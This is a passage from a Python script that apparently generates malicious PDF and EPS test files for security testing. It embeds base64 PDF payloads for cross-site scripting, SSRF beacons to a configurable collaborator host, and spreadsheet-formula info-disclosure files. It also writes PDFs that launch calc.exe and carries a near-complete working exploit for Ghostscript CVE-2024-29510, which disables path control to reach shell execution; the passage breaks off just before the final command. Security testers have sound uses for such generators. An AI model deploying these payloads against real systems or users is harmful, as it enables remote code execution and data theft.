REJCMjlENkFCODAwRjMxPiBdCj4+CnN0YXJ0eHJlZgoyODEwCiUlRU9G')
    pdf_xss20_jspdf_chrome_enumerator_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKCMpPj4gPDwvVHlwZS9Bbm5vdC9SZWN0WzAgMCA5MDAgOTAwXS9TdWJ0eXBlL1dpZGdldC9QYXJlbnQ8PC9GVC9CdG4vVChhKT4+L0E8PC9TL0phdmFTY3JpcHQvSlMoCihmdW5jdGlvbigpewp2YXIgb2JqID0gdGhpcywKICAgIGRhdGEgPSAnJywKICAgIGNodW5rcyA9IFtdLAogICAgY291bnRlciA9IDAsCiAgICBhZGRlZCA9IGZhbHNlLCBpLCBwcm9wcyA9IFtdOwogICAgZm9yKGkgaW4gb2JqKSB7CiAgICAgICAgcHJvcHMucHVzaChpKTsKICAgIH0KICAgIHByb3BzID0gcHJvcHMuY29uY2F0KE9iamVjdC5nZXRPd25Qcm9wZXJ0eU5hbWVzKG9iaikpOwogICAgcHJvcHMgPSBbLi4ubmV3IFNldChwcm9wcyldLnNvcnQoKTsKICAgIGZvcihpPTA7aTxwcm9wcy5sZW5ndGg7aSsrKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgZGF0YSArPSBwcm9wc1tpXSArICc9JyArIG9ialtwcm9wc1tpXV0gKyBTdHJpbmcuZnJvbUNoYXJDb2RlKDB4YSk7CiAgICAgICAgICAgIGNvdW50ZXIrKzsKICAgICAgICAgICAgaWYoY291bnRlciA+IDE1KSB7CiAgICAgICAgICAgICAgICBjaHVua3MucHVzaChkYXRhKTsKICAgICAgICAgICAgICAgIGNvdW50ZXIgPSAwOwogICAgICAgICAgICAgICAgZGF0YSA9ICcnOwogICAgICAgICAgICAgICAgYWRkZWQgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaChlKXt9CiAgICB9CiAgICBpZighYWRkZWQpIHsKICAgICAgICBjaHVua3MucHVzaChkYXRhKTsKICAgIH0KICAgIGZvcihpPTA7aTxjaHVua3MubGVuZ3RoO2krKykgewogICAgICAgIGFwcC5hbGVydChjaHVua3NbaV0pOwogICAgfQp9KSgpIAogICAgKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDEzMAo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihDbGljayBtZSB0ZXN0KSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIF0KL0NvdW50IDEKPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjExIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEyIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLVJvbWFuCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGRJdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9aYXBmRGluZ2JhdHMKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9TeW1ib2wKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMiAwIG9iago8PAovUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKL0Y0IDggMCBSCi9GNSA5IDAgUgovRjYgMTAgMCBSCi9GNyAxMSAwIFIKL0Y4IDEyIDAgUgovRjkgMTMgMCBSCi9GMTAgMTQgMCBSCi9GMTEgMTUgMCBSCi9GMTIgMTYgMCBSCi9GMTMgMTcgMCBSCi9GMTQgMTggMCBSCj4+Ci9YT2JqZWN0IDw8Cj4+Cj4+CmVuZG9iagoxOSAwIG9iago8PAovUHJvZHVjZXIgKGpzUERGIDIuMS4xKQovQ3JlYXRpb25EYXRlIChEOjIwMjAxMTI3MTE1NDEwLTAwJzAwJykKPj4KZW5kb2JqCjIwIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAgUgovT3BlbkFjdGlvbiBbMyAwIFIgL0ZpdEggbnVsbF0KL1BhZ2VMYXlvdXQgL09uZUNvbHVtbgo+PgplbmRvYmoKeHJlZgowIDIxCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMTMyMSAwMDAwMCBuIAowMDAwMDAzMTM4IDAwMDAwIG4gCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMTE0MCAwMDAwMCBuIAowMDAwMDAxMzc4IDAwMDAwIG4gCjAwMDAwMDE1MDMgMDAwMDAgbiAKMDAwMDAwMTYzMyAwMDAwMCBuIAowMDAwMDAxNzY2IDAwMDAwIG4gCjAwMDAwMDE5MDMgMDAwMDAgbiAKMDAwMDAwMjAyNiAwMDAwMCBuIAowMDAwMDAyMTU1IDAwMDAwIG4gCjAwMDAwMDIyODcgMDAwMDAgbiAKMDAwMDAwMjQyMyAwMDAwMCBuIAowMDAwMDAyNTUxIDAwMDAwIG4gCjAwMDAwMDI2NzggMDAwMDAgbiAKMDAwMDAwMjgwNyAwMDAwMCBuIAowMDAwMDAyOTQwIDAwMDAwIG4gCjAwMDAwMDMwNDIgMDAwMDAgbiAKMDAwMDAwMzM4NiAwMDAwMCBuIAowMDAwMDAzNDcyIDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMjEKL1Jvb3QgMjAgMCBSCi9JbmZvIDE5IDAgUgovSUQgWyA8QzU3RTc5RjE3MjE2QTM0QjAyMzk4NDRFRDE5ODMyMzU+IDxDNTdFNzlGMTcyMTZBMzRCMDIzOTg0NEVEMTk4MzIzNT4gXQo+PgpzdGFydHhyZWYKMzU3NgolJUVPRg==')

    # Génération des fichiers PDF avec remplacement des URLs

    pdf_content = pdf_xss13_pdflib_acrobat_alert_1_of_pdf_injection_content.replace(b'burpcollaborator.net', base_url.encode())
    if should_generate_type('xss'):
        with open(xss_dir / "xss13_pdflib_acrobat_alert-1-of-pdf-injection.pdf", 'wb') as f:
            f.write(pdf_content)

    pdf_content = pdf_xss14_pdflib_acrobat_steal_contents_of_pdf_with_js_content.replace(b'burpcollaborator.net', base_url.encode())
    if should_generate_type('xss'):
        with open(xss_dir / "xss14_pdflib_acrobat_steal-contents-of-pdf-with-js.pdf", 'wb') as f:
            f.write(pdf_content)

    pdf_content = pdf_xss15_pdflib_acrobat_steal_contents_of_pdf_without_js_content.replace(b'burpcollaborator.net', base_url.encode())
    if should_generate_type('xss'):
        with open(xss_dir / "xss15_pdflib_acrobat_steal-contents-of-pdf-without-js.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('ssrf'):
        pdf_content = pdf_ssrf25_jspdf_acrobat_make_entire_document_clickable_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf25_jspdf_acrobat_make-entire-document-clickable.pdf", 'wb') as f:
            f.write(pdf_content)

        pdf_content = pdf_ssrf26_jspdf_acrobat_track_when_opening_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf26_jspdf_acrobat_track-when-opening-pdf-filesystem.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('xss'):
        with open(xss_dir / "xss16_jspdf_acrobat_executing-automatically-when-closed.pdf", 'wb') as f:
            f.write(pdf_xss16_jspdf_acrobat_executing_automatically_when_closed_content)

    if should_generate_type('ssrf'):
        pdf_content = pdf_ssrf27_jspdf_acrobat_track_when_closing_pdf_filesystem_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf27_jspdf_acrobat_track-when-closing-pdf-filesystem.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('xss'):
        with open(xss_dir / "xss17_jspdf_acrobat_executing-automatically-without-click.pdf", 'wb') as f:
            f.write(pdf_xss17_jspdf_acrobat_executing_automatically_without_click_content)

    if should_generate_type('ssrf'):
        pdf_content = pdf_ssrf28_jspdf_acrobat_enumerator_content.replace(b'http://your-id-', f'http://{burp_collab}/'.encode())
        pdf_content = pdf_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf28_jspdf_acrobat_enumerator.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('xss'):
        with open(xss_dir / "xss18_jspdf_hybrid_hybrid.pdf", 'wb') as f:
            f.write(pdf_xss18_jspdf_hybrid_hybrid_content)

    if should_generate_type('ssrf'):
        pdf_content = pdf_ssrf29_jspdf_chrome_pdf_ssrf_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf29_jspdf_chrome_pdf-ssrf.pdf", 'wb') as f:
            f.write(pdf_content)

        pdf_content = pdf_ssrf30_jspdf_chrome_extracting_text_content.replace(b'burpcollaborator.net', base_url.encode())
        with open(ssrf_dir / "ssrf30_jspdf_chrome_extracting-text.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('xss'):
        with open(xss_dir / "xss19_jspdf_chrome_js-execution.pdf", 'wb') as f:
            f.write(pdf_xss19_jspdf_chrome_js_execution_content)

    if should_generate_type('ssrf'):
        pdf_content = pdf_ssrf31_jspdf_chrome_injection_overwrite_url_content.replace(b'https://portswigger.net', base_url.encode())
        pdf_content = pdf_content.replace(b'portswigger.net', base_url.encode())
        with open(ssrf_dir / "ssrf31_jspdf_chrome_injection-overwrite-url.pdf", 'wb') as f:
            f.write(pdf_content)

    if should_generate_type('xss'):
        with open(xss_dir / "xss20_jspdf_chrome_enumerator.pdf", 'wb') as f:
            f.write(pdf_xss20_jspdf_chrome_enumerator_content)

    if should_generate_type('info'):
        pdf_info1_cell_filename = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: CELL filename)
/Author (=CELL("filename"))
/Subject (=CELL("filename"))
/Keywords (=CELL("filename"))
/Creator (=CELL("filename"))
/Producer (=CELL("filename"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
        with open(info_dir / "info1_cell_filename.pdf", 'wb') as f:
            f.write(pdf_info1_cell_filename.encode())
        
        pdf_info2_info_version = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO version)
/Author (=INFO("version"))
/Subject (=INFO("version"))
/Keywords (=INFO("version"))
/Creator (=INFO("version"))
/Producer (=INFO("version"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
        with open(info_dir / "info2_info_version.pdf", 'wb') as f:
            f.write(pdf_info2_info_version.encode())
        
        pdf_info3_info_system = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO system)
/Author (=INFO("system"))
/Subject (=INFO("system"))
/Keywords (=INFO("system"))
/Creator (=INFO("system"))
/Producer (=INFO("system"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
        with open(info_dir / "info3_info_system.pdf", 'wb') as f:
            f.write(pdf_info3_info_system.encode())
        
        pdf_info4_now = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: NOW)
/Author (=NOW())
/Subject (=NOW())
/Keywords (=NOW())
/Creator (=NOW())
/Producer (=NOW())
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
        with open(info_dir / "info4_now.pdf", 'wb') as f:
            f.write(pdf_info4_now.encode())
        
        pdf_info5_info_directory = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Info 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Title (Info Disclosure: INFO directory)
/Author (=INFO("directory"))
/Subject (=INFO("directory"))
/Keywords (=INFO("directory"))
/Creator (=INFO("directory"))
/Producer (=INFO("directory"))
/CreationDate (D:20240101000000Z)
/ModDate (D:20240101000000Z)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
/Info 3 0 R
>>
startxref
0
%%EOF'''
        with open(info_dir / "info5_info_directory.pdf", 'wb') as f:
            f.write(pdf_info5_info_directory.encode())
    
    pdf_rce3_openDoc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.openDoc("/C/Windows/System32/calc.exe");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce3_openDoc.pdf", 'wb') as f:
            f.write(pdf_rce3_openDoc.encode())
    
    pdf_rce4_uri_start = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (START C:/\\Windows/\\system32/\\calc.exe)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce4_uri_start.pdf", 'wb') as f:
            f.write(pdf_rce4_uri_start.encode())
    
    pdf_rce5_launchURL = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.launchURL\\("START C:/\\Windows/\\system32/\\calc.exe", true\\); app.launchURL\\("javascript:confirm\\(3\\);", true\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce5_launchURL.pdf", 'wb') as f:
            f.write(pdf_rce5_launchURL.encode())
    
    pdf_rce6_launchURL_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); app.launchURL\\("/C/Windows/system32/calc.exe", true\\); app.launchURL\\("'><details open ontoggle=confirm\\(3\\);", true\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce6_launchURL_file.pdf", 'wb') as f:
            f.write(pdf_rce6_launchURL_file.encode())
    
    # RCE: rce7_cve_2024_29510.eps - CVE-2024-29510 Ghostscript RCE via uniprint format string
    # BACKEND: all (Ghostscript)
    # DETECTION: Out-of-band via Burp Collaborator
    # OBSERVER: Requête HTTP GET vers http://burp_collab/rce-cve-2024-29510
    # Technique: Exploit complet CVE-2024-29510 avec leak stack, overwrite path_control_active, puis RCE via %pipe%
    # Source: https://raw.githubusercontent.com/codean-labs/pocs/refs/heads/main/CVE-2024-29510%20(Ghostscript)/CVE-2024-29510_poc_calc.eps
    cve_2024_29510_eps = f'''%!PS-Adobe-3.0 EPSF-3.0
%%Pages: 1
%%BoundingBox:   36   36  576  756
%%LanguageLevel: 1
%%EndComments
%%BeginProlog
%%EndProlog


% ====== Configuration ======

% Offset of `gp_file *out` on the stack
/IdxOutPtr 5 def


% ====== General Postscript utility functions ======

% from: https://github.com/scriptituk/pslutils/blob/master/string.ps
/cat {{
	exch
	dup length 2 index length add string
	dup dup 5 2 roll
	copy length exch putinterval
}} bind def

% from: https://rosettacode.org/wiki/Repeat_a_string#PostScript
/times {{
  dup length dup    % rcount ostring olength olength
  4 3 roll          % ostring olength olength rcount
  mul dup string    % ostring olength flength fstring
  4 1 roll          % fstring ostring olength flength
  1 sub 0 3 1 roll  % fstring ostring 0 olength flength_minus_one 
  {{                 % fstring ostring iter
    1 index 3 index % fstring ostring iter ostring fstring
    3 1 roll        % fstring ostring fstring iter ostring
    putinterval     % fstring ostring
  }} for
  pop               % fstring
}} bind def

% Printing helpers
/println {{ print (\\012) print }} bind def
/printnumln {{ =string cvs println }} bind def

% ====== Start of exploit helper code ======

% Make a new tempfile but only save its path. This gives us a file path to read/write 
% which will exist as long as this script runs. We don't actually use the file object
% (hence `pop`) because we're passing the path to uniprint and reopening it ourselves.
/PathTempFile () (w+) .tempfile pop def


% Convert hex string "4142DEADBEEF" to padded little-endian byte string <EFBEADDE42410000>
% <HexStr> str_ptr_to_le_bytes <ByteStringLE>
/str_ptr_to_le_bytes {{
	% Convert hex string argument to Postscript string
	% using <DEADBEEF> notation
	/ArgBytes exch (<) exch (>) cat cat token pop exch pop def

	% Prepare resulting string (`string` fills with zeros)
	/Res 8 string def

	% For every byte in the input
	0 1 ArgBytes length 1 sub {{
		/i exch def

		% put byte at index (len(ArgBytes) - 1 - i)
		Res ArgBytes length 1 sub i sub ArgBytes i get put
	}} for

	Res % return
}} bind def


% <StackString> <FmtString> do_uniprint <LeakedData>
/do_uniprint {{
	/FmtString exch def
	/StackString exch def

	% Select uniprint device with our payload
	<<
		/OutputFile PathTempFile
		/OutputDevice /uniprint
		/upColorModel /DeviceCMYKgenerate
		/upRendering /FSCMYK32
		/upOutputFormat /Pcl
		/upOutputWidth 99999
		/upWriteComponentCommands {{(x)(x)(x)(x)}} % This is required, just put bogus strings
		/upYMoveCommand FmtString
	>>
	setpagedevice
	
	% Manipulate the interpreter to put a recognizable piece of data on the stack
	(%%__) StackString cat .runstring

	% Produce a page with some content to trigger uniprint logic
	newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke
	showpage

	% Read back the written data
	/InFile PathTempFile (r) file def
	/LeakedData InFile 4096 string readstring pop def
	InFile closefile

	LeakedData % return
}} bind def


% get_index_of_controllable_stack <Idx>
/get_index_of_controllable_stack {{
	% A recognizable token on the stack to search for
	/SearchToken (ABABABAB) def

	% Construct "1:%lx,2:%lx,3:%lx,...,400:%lx,"
	/FmtString 0 string 1 1 400 {{ 3 string cvs (:%lx,) cat cat }} for def

	SearchToken FmtString do_uniprint

	% Search for ABABABAB => 4241424142414241 (assume LE)
	(4241424142414241) search {{
		exch pop
		exch pop
		% <pre> is left

		% Search for latest comma in <pre> to get e.g. `123:` as <post>
		(,) rsearch pop pop pop

		% Search for colon and use <pre> to get `123`
		(:) search pop exch pop exch pop

		% return as int
		cvi
	}} {{
		(Could not find our data on the stack.. exiting) println
		quit
	}} ifelse
}} bind def


% <StackIdx> <AddrHex> write_to
/write_to {{
	/AddrHex exch str_ptr_to_le_bytes def % address to write to
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (_%ln) cat def

	AddrHex FmtString do_uniprint

	pop % we don't care about formatted data
}} bind def


% <StackIdx> read_ptr_at <PtrHexStr>
/read_ptr_at {{
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (__%lx__) cat def

	() FmtString do_uniprint

	(__) search pop pop pop (__) search pop exch pop exch pop
}} bind def


% num_bytes <= 9
% <StackIdx> <PtrHex> <NumBytes> read_dereferenced_bytes_at <ResultAsMultipliedInt>
/read_dereferenced_bytes_at {{
	/NumBytes exch def
	/PtrHex exch def
	/PtrOct PtrHex str_ptr_to_le_bytes def % address to read from
	/StackIdx exch def % stack idx to use

	/FmtString StackIdx 1 sub (%x) times (__%.) NumBytes 1 string cvs cat (s__) cat cat def

	PtrOct FmtString do_uniprint

	/Data exch (__) search pop pop pop (__) search pop exch pop exch pop def

	% Check if we were able to read all bytes
	Data length NumBytes eq {{
		% Yes we did! So return the integer conversion of the bytes
		0 % accumulator
		NumBytes 1 sub -1 0 {{
			exch % <i> <accum>
			256 mul exch % <accum*256> <i>
			Data exch get % <accum*256> <Data[i]>
			add % <accum*256 + Data[i]>
		}} for
	}} {{
		% We did not read all bytes, add a null byte and recurse on addr+1
		StackIdx 1 PtrHex ptr_add_offset NumBytes 1 sub read_dereferenced_bytes_at
		256 mul
	}} ifelse
}} bind def


% <StackIdx> <AddrHex> read_dereferenced_ptr_at <PtrHexStr>
/read_dereferenced_ptr_at {{
	% Read 6 bytes
	6 read_dereferenced_bytes_at

	% Convert to hex string and return
	16 12 string cvrs
}} bind def


% <Offset> <PtrHexStr> ptr_add_offset <PtrHexStr>
/ptr_add_offset {{
	/PtrHexStr exch def % hex string pointer
	/Offset exch def % integer to add

	/PtrNum (16#) PtrHexStr cat cvi def

	% base 16, string length 12
	PtrNum Offset add 16 12 string cvrs
}} bind def


() println

% ====== Start of exploit logic ======


% Find out the index of the controllable bytes
% This is around the 200-300 range but differs per binary/version
/IdxStackControllable get_index_of_controllable_stack def
(Found controllable stack region at index: ) print IdxStackControllable printnumln

% Exploit steps:
% - `gp_file *out` is at stack index `IdxOutPtr`.
%
% - Controllable data is at index `IdxStackControllable`.
%
% - We want to find out the address of: 
%       out->memory->gs_lib_ctx->core->path_control_active
%   hence we need to dereference and add ofsets a few times
%
% - Once we have the address of `path_control_active`, we use
%   our write primitive to write an integer to its address - 3
%   such that the most significant bytes (zeros) of that integer
%   overwrite `path_control_active`, setting it to 0.
%
% - Finally, with `path_control_active` disabled, we can use
%   the built-in (normally sandboxed) `%pipe%` functionality to
%   run shell commands


/PtrOut IdxOutPtr read_ptr_at def

(out: 0x) PtrOut cat println


% memory is at offset 144 in out
/PtrOutOffset 144 PtrOut ptr_add_offset def
/PtrMem IdxStackControllable PtrOutOffset read_dereferenced_ptr_at def

(out->mem: 0x) PtrMem cat println

% gs_lib_ctx is at offset 208 in memory
/PtrMemOffset 208 PtrMem ptr_add_offset def
/PtrGsLibCtx IdxStackControllable PtrMemOffset read_dereferenced_ptr_at def

(out->mem->gs_lib_ctx: 0x) PtrGsLibCtx cat println

% core is at offset 8 in gs_lib_ctx
/PtrGsLibCtxOffset 8 PtrGsLibCtx ptr_add_offset def
/PtrCore IdxStackControllable PtrGsLibCtxOffset read_dereferenced_ptr_at def

(out->mem->gs_lib_ctx->core: 0x) PtrCore cat println

% path_control_active is at offset 156 in core
/PtrPathControlActive 156 PtrCore ptr_add_offset def

(out->mem->gs_lib_ctx->core->path_control_active: 0x) PtrPathControlActive cat println

% Subtract a bit from the address to make sure we write a null over the field
/PtrTarget -3 PtrPathControlActive ptr_add_offset def

% And overwrite it!
IdxStackControllable PtrTarget write_to


% And now `path_control_active` == 0, so we can use %pipe%

